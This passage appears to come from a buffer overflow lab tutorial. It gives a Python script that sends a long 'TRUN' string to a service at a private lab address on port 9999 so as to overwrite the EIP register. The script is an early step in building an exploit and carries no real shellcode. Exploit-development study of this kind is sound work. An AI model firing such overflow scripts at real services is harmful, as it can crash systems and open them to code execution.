We are going to be using a script to overwrite the `EIP` 

```python
#!/usr/bin/python
 
import sys, socket

# replace 2003 with the offset you got 
shellcode = "A" * 2003 + "B" * 4

try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.106',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print ("Error Connecting to the server")
        sys.exit()
```